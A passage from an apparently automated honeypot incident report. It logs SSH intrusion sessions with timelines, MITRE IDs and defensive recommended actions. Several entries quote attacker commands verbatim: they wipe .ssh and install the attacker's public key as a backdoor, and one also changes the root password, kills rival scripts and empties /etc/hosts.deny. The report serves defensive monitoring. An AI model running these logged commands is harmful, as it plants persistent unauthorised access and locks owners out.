| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 05:08:09` | `cowrie.session.connect` |
| `2026-05-24 05:08:09` | `cowrie.client.version` |
| `2026-05-24 05:08:09` | `cowrie.client.kex` |
| `2026-05-24 05:08:09` | `cowrie.login.success` |
| `2026-05-24 05:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.202[.]217` to AbuseIPDB if not already reported
- [ ] Block `45.78.202[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6819872af27

| Field | Detail |
|---|---|
| **Source IP** | `40.121.179[.]100` |
| **First Seen** | 2026-05-24 05:45 |
| **Last Seen** | 2026-05-24 05:46 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 05:45:55` | `cowrie.session.connect` |
| `2026-05-24 05:45:58` | `cowrie.client.version` |
| `2026-05-24 05:46:00` | `cowrie.client.kex` |
| `2026-05-24 05:46:06` | `cowrie.login.success` |
| `2026-05-24 05:46:07` | `cowrie.session.params` |
| `2026-05-24 05:46:07` | `cowrie.command.input` |
| `2026-05-24 05:46:07` | `cowrie.command.failed` |
| `2026-05-24 05:46:09` | `cowrie.log.closed` |
| `2026-05-24 05:46:10` | `cowrie.session.params` |
| `2026-05-24 05:46:10` | `cowrie.command.input` |
| `2026-05-24 05:46:11` | `cowrie.session.file_download` |
| `2026-05-24 05:46:11` | `cowrie.log.closed` |
| `2026-05-24 05:46:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.179[.]100` to AbuseIPDB if not already reported
- [ ] Block `40.121.179[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8600c1c61a25

| Field | Detail |
|---|---|
| **Source IP** | `40.121.179[.]100` |
| **First Seen** | 2026-05-24 05:46 |
| **Last Seen** | 2026-05-24 05:46 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 05:46:24` | `cowrie.session.connect` |
| `2026-05-24 05:46:24` | `cowrie.client.version` |
| `2026-05-24 05:46:25` | `cowrie.client.kex` |
| `2026-05-24 05:46:34` | `cowrie.login.success` |
| `2026-05-24 05:46:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.179[.]100` to AbuseIPDB if not already reported
- [ ] Block `40.121.179[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c80b4f41794

| Field | Detail |
|---|---|
| **Source IP** | `113.249.112[.]97` |
| **First Seen** | 2026-05-24 06:22 |
| **Last Seen** | 2026-05-24 06:22 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 06:22:28` | `cowrie.session.connect` |
| `2026-05-24 06:22:29` | `cowrie.client.version` |
| `2026-05-24 06:22:29` | `cowrie.client.kex` |
| `2026-05-24 06:22:29` | `cowrie.login.success` |
| `2026-05-24 06:22:30` | `cowrie.session.params` |
| `2026-05-24 06:22:30` | `cowrie.command.input` |
| `2026-05-24 06:22:30` | `cowrie.command.failed` |
| `2026-05-24 06:22:30` | `cowrie.log.closed` |
| `2026-05-24 06:22:30` | `cowrie.session.params` |
| `2026-05-24 06:22:30` | `cowrie.command.input` |
| `2026-05-24 06:22:30` | `cowrie.session.file_download` |
| `2026-05-24 06:22:30` | `cowrie.log.closed` |
| `2026-05-24 06:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.249.112[.]97` to AbuseIPDB if not already reported
- [ ] Block `113.249.112[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-137dff100600

| Field | Detail |
|---|---|
| **Source IP** | `113.249.112[.]97` |
| **First Seen** | 2026-05-24 06:22 |
| **Last Seen** | 2026-05-24 06:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 06:22:38` | `cowrie.session.connect` |
| `2026-05-24 06:22:38` | `cowrie.client.version` |
| `2026-05-24 06:22:39` | `cowrie.client.kex` |
| `2026-05-24 06:22:39` | `cowrie.login.success` |
| `2026-05-24 06:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.249.112[.]97` to AbuseIPDB if not already reported
- [ ] Block `113.249.112[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5850935abe0c

| Field | Detail |
|---|---|
| **Source IP** | `113.249.112[.]97` |
| **First Seen** | 2026-05-24 06:24 |
| **Last Seen** | 2026-05-24 06:25 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:8NmnKQI9CcM9"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 06:24:50` | `cowrie.session.connect` |
| `2026-05-24 06:24:50` | `cowrie.client.version` |
| `2026-05-24 06:24:50` | `cowrie.client.kex` |
| `2026-05-24 06:24:50` | `cowrie.login.success` |
| `2026-05-24 06:24:51` | `cowrie.session.params` |
| `2026-05-24 06:24:51` | `cowrie.command.input` |
| `2026-05-24 06:24:51` | `cowrie.command.failed` |
| `2026-05-24 06:24:51` | `cowrie.log.closed` |
| `2026-05-24 06:24:51` | `cowrie.session.params` |
| `2026-05-24 06:24:51` | `cowrie.command.input` |
| `2026-05-24 06:24:51` | `cowrie.session.file_download` |
| `2026-05-24 06:24:51` | `cowrie.log.closed` |
| `2026-05-24 06:25:08` | `cowrie.session.params` |
| `2026-05-24 06:25:08` | `cowrie.command.input` |
| `2026-05-24 06:25:08` | `cowrie.log.closed` |
| `2026-05-24 06:25:09` | `cowrie.session.params` |
| `2026-05-24 06:25:09` | `cowrie.command.input` |
| `2026-05-24 06:25:09` | `cowrie.log.closed` |
| `2026-05-24 06:25:09` | `cowrie.session.params` |
| `2026-05-24 06:25:09` | `cowrie.command.input` |
| `2026-05-24 06:25:10` | `cowrie.session.file_download` |
| `2026-05-24 06:25:10` | `cowrie.log.closed` |
| `2026-05-24 06:25:10` | `cowrie.session.params` |
| `2026-05-24 06:25:10` | `cowrie.command.input` |
| `2026-05-24 06:25:11` | `cowrie.log.closed` |
| `2026-05-24 06:25:11` | `cowrie.session.params` |
| `2026-05-24 06:25:11` | `cowrie.command.input` |
| `2026-05-24 06:25:11` | `cowrie.log.closed` |
| `2026-05-24 06:25:11` | `cowrie.session.params` |
| `2026-05-24 06:25:11` | `cowrie.command.input` |
| `2026-05-24 06:25:11` | `cowrie.command.input` |
| `2026-05-24 06:25:12` | `cowrie.log.closed` |
| `2026-05-24 06:25:12` | `cowrie.session.params` |
| `2026-05-24 06:25:12` | `cowrie.command.input` |
| `2026-05-24 06:25:12` | `cowrie.log.closed` |
| `2026-05-24 06:25:12` | `cowrie.session.params` |
| `2026-05-24 06:25:12` | `cowrie.command.input` |
| `2026-05-24 06:25:13` | `cowrie.log.closed` |
| `2026-05-24 06:25:13` | `cowrie.session.params` |
| `2026-05-24 06:25:13` | `cowrie.command.input` |
| `2026-05-24 06:25:13` | `cowrie.log.closed` |
| `2026-05-24 06:25:13` | `cowrie.session.params` |
| `2026-05-24 06:25:13` | `cowrie.command.input` |
| `2026-05-24 06:25:14` | `cowrie.log.closed` |
| `2026-05-24 06:25:14` | `cowrie.session.params` |
| `2026-05-24 06:25:14` | `cowrie.command.input` |
| `2026-05-24 06:25:14` | `cowrie.log.closed` |
| `2026-05-24 06:25:14` | `cowrie.session.params` |
| `2026-05-24 06:25:14` | `cowrie.command.input` |
| `2026-05-24 06:25:15` | `cowrie.log.closed` |
| `2026-05-24 06:25:15` | `cowrie.session.params` |
| `2026-05-24 06:25:15` | `cowrie.command.input` |
| `2026-05-24 06:25:15` | `cowrie.log.closed` |
| `2026-05-24 06:25:15` | `cowrie.session.params` |
| `2026-05-24 06:25:15` | `cowrie.command.input` |
| `2026-05-24 06:25:16` | `cowrie.log.closed` |
| `2026-05-24 06:25:16` | `cowrie.session.params` |
| `2026-05-24 06:25:16` | `cowrie.command.input` |
| `2026-05-24 06:25:16` | `cowrie.log.closed` |
| `2026-05-24 06:25:17` | `cowrie.session.params` |
| `2026-05-24 06:25:17` | `cowrie.command.input` |
| `2026-05-24 06:25:17` | `cowrie.log.closed` |
| `2026-05-24 06:25:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.249.112[.]97` to AbuseIPDB if not already reported
- [ ] Block `113.249.112[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67887822b184

| Field | Detail |
|---|---|
| **Source IP** | `154.83.12[.]172` |
| **First Seen** | 2026-05-24 06:25 |
| **Last Seen** | 2026-05-24 06:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 06:25:38` | `cowrie.session.connect` |
| `2026-05-24 06:25:38` | `cowrie.client.version` |
| `2026-05-24 06:25:38` | `cowrie.client.kex` |
| `2026-05-24 06:25:38` | `cowrie.login.success` |
| `2026-05-24 06:25:38` | `cowrie.session.params` |
| `2026-05-24 06:25:38` | `cowrie.command.input` |
| `2026-05-24 06:25:38` | `cowrie.command.failed` |
| `2026-05-24 06:25:39` | `cowrie.log.closed` |
| `2026-05-24 06:25:39` | `cowrie.session.params` |
| `2026-05-24 06:25:39` | `cowrie.command.input` |
| `2026-05-24 06:25:39` | `cowrie.session.file_download` |
| `2026-05-24 06:25:39` | `cowrie.log.closed` |
| `2026-05-24 06:25:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.12[.]172` to AbuseIPDB if not already reported
- [ ] Block `154.83.12[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c0795a0662a

| Field | Detail |
|---|---|
| **Source IP** | `154.83.12[.]172` |
| **First Seen** | 2026-05-24 06:25 |
| **Last Seen** | 2026-05-24 06:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 06:25:41` | `cowrie.session.connect` |
| `2026-05-24 06:25:41` | `cowrie.client.version` |
| `2026-05-24 06:25:41` | `cowrie.client.kex` |
| `2026-05-24 06:25:41` | `cowrie.login.success` |
| `2026-05-24 06:25:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.12[.]172` to AbuseIPDB if not already reported
- [ ] Block `154.83.12[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e710f0a409ee

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-24 06:28 |
| **Last Seen** | 2026-05-24 06:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 06:28:59` | `cowrie.session.connect` |
| `2026-05-24 06:28:59` | `cowrie.client.version` |
| `2026-05-24 06:28:59` | `cowrie.client.kex` |
| `2026-05-24 06:29:00` | `cowrie.login.success` |
| `2026-05-24 06:29:01` | `cowrie.session.params` |
| `2026-05-24 06:29:01` | `cowrie.command.input` |
| `2026-05-24 06:29:01` | `cowrie.command.failed` |
| `2026-05-24 06:29:02` | `cowrie.log.closed` |
| `2026-05-24 06:29:02` | `cowrie.session.params` |
| `2026-05-24 06:29:02` | `cowrie.command.input` |
| `2026-05-24 06:29:02` | `cowrie.session.file_download` |
| `2026-05-24 06:29:02` | `cowrie.log.closed` |
| `2026-05-24 06:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc6a42ede79c

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-24 06:29 |
| **Last Seen** | 2026-05-24 06:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 06:29:06` | `cowrie.session.connect` |
| `2026-05-24 06:29:06` | `cowrie.client.version` |
| `2026-05-24 06:29:06` | `cowrie.client.kex` |
| `2026-05-24 06:29:07` | `cowrie.login.success` |
| `2026-05-24 06:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e12bd719173

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-24 06:33 |
| **Last Seen** | 2026-05-24 06:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 06:33:08` | `cowrie.session.connect` |
| `2026-05-24 06:33:08` | `cowrie.client.version` |
| `2026-05-24 06:33:08` | `cowrie.client.kex` |
| `2026-05-24 06:33:09` | `cowrie.login.success` |
| `2026-05-24 06:33:10` | `cowrie.session.params` |
| `2026-05-24 06:33:10` | `cowrie.command.input` |
| `2026-05-24 06:33:10` | `cowrie.command.failed` |
| `2026-05-24 06:33:10` | `cowrie.log.closed` |
| `2026-05-24 06:33:11` | `cowrie.session.params` |
| `2026-05-24 06:33:11` | `cowrie.command.input` |
| `2026-05-24 06:33:11` | `cowrie.session.file_download` |
| `2026-05-24 06:33:11` | `cowrie.log.closed` |
| `2026-05-24 06:33:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f621f2277b67

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-24 06:33 |
| **Last Seen** | 2026-05-24 06:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 06:33:14` | `cowrie.session.connect` |
| `2026-05-24 06:33:14` | `cowrie.client.version` |
| `2026-05-24 06:33:15` | `cowrie.client.kex` |
| `2026-05-24 06:33:16` | `cowrie.login.success` |
| `2026-05-24 06:33:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa6f1aa38b97

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-24 06:54 |
| **Last Seen** | 2026-05-24 06:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 06:54:14` | `cowrie.session.connect` |
| `2026-05-24 06:54:14` | `cowrie.client.version` |
| `2026-05-24 06:54:14` | `cowrie.client.kex` |
| `2026-05-24 06:54:16` | `cowrie.login.success` |
| `2026-05-24 06:54:16` | `cowrie.session.params` |
| `2026-05-24 06:54:16` | `cowrie.command.input` |
| `2026-05-24 06:54:16` | `cowrie.command.failed` |
| `2026-05-24 06:54:17` | `cowrie.log.closed` |
| `2026-05-24 06:54:17` | `cowrie.session.params` |
| `2026-05-24 06:54:17` | `cowrie.command.input` |
| `2026-05-24 06:54:17` | `cowrie.session.file_download` |
| `2026-05-24 06:54:17` | `cowrie.log.closed` |
| `2026-05-24 06:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b6fe5dfa305

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-24 06:54 |
| **Last Seen** | 2026-05-24 06:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 06:54:21` | `cowrie.session.connect` |
| `2026-05-24 06:54:21` | `cowrie.client.version` |
| `2026-05-24 06:54:21` | `cowrie.client.kex` |
| `2026-05-24 06:54:22` | `cowrie.login.success` |
| `2026-05-24 06:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bf76d3d88fb

| Field | Detail |
|---|---|
| **Source IP** | `125.22.162[.]46` |
| **First Seen** | 2026-05-24 07:14 |
| **Last Seen** | 2026-05-24 07:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 07:14:51` | `cowrie.session.connect` |
| `2026-05-24 07:14:51` | `cowrie.client.version` |
| `2026-05-24 07:14:51` | `cowrie.client.kex` |
| `2026-05-24 07:14:51` | `cowrie.login.success` |
| `2026-05-24 07:14:51` | `cowrie.session.params` |
| `2026-05-24 07:14:51` | `cowrie.command.input` |
| `2026-05-24 07:14:51` | `cowrie.command.failed` |
| `2026-05-24 07:14:51` | `cowrie.log.closed` |
| `2026-05-24 07:14:51` | `cowrie.session.params` |
